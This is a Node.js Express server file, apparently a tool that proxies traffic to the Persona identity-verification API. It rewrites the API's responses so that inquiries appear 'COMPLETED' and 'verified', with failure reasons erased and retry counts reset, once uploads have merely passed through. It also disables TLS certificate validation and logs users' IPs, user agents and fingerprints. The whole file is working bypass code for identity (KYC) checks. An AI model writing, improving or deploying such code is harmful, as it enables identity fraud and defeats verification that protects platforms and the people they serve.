const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const https = require('https');
const zlib = require('zlib');
const fs = require('fs');
const path = require('path');
require("dotenv").config();

const app = express();

const YOUR_INQUIRY_ID = process.env.YOUR_INQUIRY_ID;
const YOUR_ACCOUNT_ID = process.env.YOUR_ACCOUNT_ID;
const YOUR_TEMPLATE_ID = process.env.YOUR_TEMPLATE_ID;
const PERSONA_API_KEY = process.env.PERSONA_API_KEY;

if (!YOUR_INQUIRY_ID || !YOUR_ACCOUNT_ID || !YOUR_TEMPLATE_ID) {
    console.error('Missing required environment variables');
    process.exit(1);
}

app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PATCH, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    next();
});

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));

const inquiryState = {};
const LOG_FILE = path.join(__dirname, 'usage-logs.json');

function logUsage(data) {
    try {
        let logs = [];
        if (fs.existsSync(LOG_FILE)) {
            const content = fs.readFileSync(LOG_FILE, 'utf8');
            logs = JSON.parse(content);
        }
        logs.push({ ...data, timestamp: new Date().toISOString() });
        fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
    } catch (error) {}
}

function getClientInfo(req) {
    return {
        ip: req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || null,
        userAgent: req.headers['user-agent'] || null,
        fingerprint: req.headers['x-fingerprint'] || null,
        sessionId: req.headers['x-session-id'] || null
    };
}

function decompressResponse(proxyRes) {
    return new Promise((resolve, reject) => {
        const chunks = [];
        const encoding = proxyRes.headers['content-encoding'];
        
        proxyRes.on('data', (chunk) => chunks.push(chunk));
        proxyRes.on('end', () => {
            const buffer = Buffer.concat(chunks);
            if (encoding && encoding.includes('gzip')) {
                zlib.gunzip(buffer, (err, decoded) => {
                    if (err) reject(err);
                    else resolve(decoded.toString('utf8'));
                });
            } else {
                resolve(buffer.toString('utf8'));
            }
        });
        proxyRes.on('error', reject);
    });
}

function getInquiryId(req) {
    const match = req.url.match(/\/inquiries\/([^\/?]+)/);
    if (match) return match[1];
    if (req.body?.data?.id) return req.body.data.id;
    if (req.body?.data?.attributes?.inquiry_id) return req.body.data.attributes.inquiry_id;
    if (req.body?.data?.attributes?.inquiry) return req.body.data.attributes.inquiry;
    return null;
}

function modifyInquiryResponse(data, inquiryId) {
    try {
        if (!data?.data) return data;
        const state = inquiryState[inquiryId];
        const isComplete = state?.countrySelected && state?.idUploaded && state?.selfieVerified;
        
        if (Array.isArray(data.data)) {
            data.data.forEach(item => {
                if (item?.attributes && isComplete) {
                    item.attributes.status = 'COMPLETED';
                    item.attributes['verification-status'] = 'verified';
                    item.attributes.failureReasons = [];
                    item.attributes.latestFailureReasons = [];
                    item.attributes.remainingAttempts = 3;
                }
            });
        } else if (data.data.attributes && isComplete) {
            data.data.attributes.status = 'COMPLETED';
            data.data.attributes['verification-status'] = 'verified';
            data.data.attributes.failureReasons = [];
            data.data.attributes.latestFailureReasons = [];
            data.data.attributes.remainingAttempts = 3;
            data.data.attributes['reusable-persona-status'] = null;
            data.data.attributes['is-reusable-persona-trusted-device'] = true;
        }
        return data;
    } catch (e) {
        return data;
    }
}

function getTargetHost(req) {
    // Use the host from the request headers
    const host = req.headers['host'];
    if (host) {
        // Extract the domain from the request
        const domainMatch = host.match(/^(?:[^.]+\.)?(.+)$/);
        if (domainMatch) {
            return host;
        }
    }
    // Default to standard Persona API
    return 'api.withpersona.com';
}

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        target: 'Dynamic - any Persona subdomain',
        environment: process.env.NODE_ENV || 'production',
        config: {
            hasInquiryId: !!YOUR_INQUIRY_ID,
            hasAccountId: !!YOUR_ACCOUNT_ID,
            hasTemplateId: !!YOUR_TEMPLATE_ID
        }
    });
});

app.get('/', (req, res) => {
    res.json({
        message: 'Universal Persona Proxy Server is running',
        version: '1.0.0',
        endpoints: {
            health: '/health',
            proxy: '/*'
        }
    });
});

app.all('*', async (req, res) => {
    if (req.path === '/health') {
        return;
    }

    const targetHost = getTargetHost(req);
    const inquiryId = getInquiryId(req);

    if (req.url.includes('/inquiries') && req.method === 'PATCH') {
        try {
            const body = JSON.parse(req.body);
            if (body?.data?.attributes?.fields?.selected_country_code && inquiryId) {
                if (!inquiryState[inquiryId]) inquiryState[inquiryId] = {};
                inquiryState[inquiryId].countrySelected = true;
            }
        } catch (e) {}
    }

    if ((req.url.includes('/documents') || req.url.includes('/relationships/documents')) && inquiryId) {
        if (!inquiryState[inquiryId]) inquiryState[inquiryId] = {};
        inquiryState[inquiryId].idUploaded = true;
        const clientInfo = getClientInfo(req);
        logUsage({ endpoint: req.url, type: 'document_upload', inquiryId, ...clientInfo });
    }

    if ((req.url.includes('/selfies') || req.url.includes('/relationships/selfies')) && inquiryId) {
        if (!inquiryState[inquiryId]) inquiryState[inquiryId] = {};
        inquiryState[inquiryId].selfieVerified = true;
        const clientInfo = getClientInfo(req);
        logUsage({ endpoint: req.url, type: 'selfie_upload', inquiryId, ...clientInfo });
    }

    const options = {
        method: req.method,
        headers: {
            ...req.headers,
            host: targetHost,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept-Encoding': 'identity'
        },
        hostname: targetHost,
        path: req.url,
        port: 443,
        rejectUnauthorized: false,
        secureOptions: require('constants').SSL_OP_NO_TLSv1_2,
        ciphers: 'DEFAULT@SECLEVEL=1'
    };
    
    try {
        const proxyReq = https.request(options, async (proxyRes) => {
            try {
                let responseBody = await decompressResponse(proxyRes);
                let modifiedBody = responseBody;
                let statusCode = proxyRes.statusCode;
                let contentType = proxyRes.headers['content-type'] || 'application/json';
                
                try {
                    if (responseBody) {
                        const data = JSON.parse(responseBody);
                        let id = inquiryId;
                        if (!id && data?.data?.id) id = data.data.id;
                        
                        if (req.url.includes('inquiry') || req.url.includes('inquiries') || req.url.includes('verification')) {
                            const modified = modifyInquiryResponse(data, id);
                            modifiedBody = JSON.stringify(modified);
                        }
                    }
                } catch (e) {}
                
                res.status(statusCode);
                res.setHeader('Content-Type', contentType);
                res.setHeader('Content-Encoding', 'identity');
                res.end(modifiedBody);
            } catch (err) {
                res.status(500).json({ error: 'Proxy error: ' + err.message });
            }
        });
        
        proxyReq.on('error', (err) => {
            res.status(500).json({ error: 'Proxy error: ' + err.message });
        });
        
        if (req.body && Object.keys(req.body).length > 0) {
            proxyReq.write(JSON.stringify(req.body));
        }
        
        proxyReq.end();
    } catch (err) {
        res.status(500).json({ error: 'Proxy error: ' + err.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('Universal Persona Proxy server running on port ' + PORT);
    console.log('Handles any Persona subdomain dynamically');
});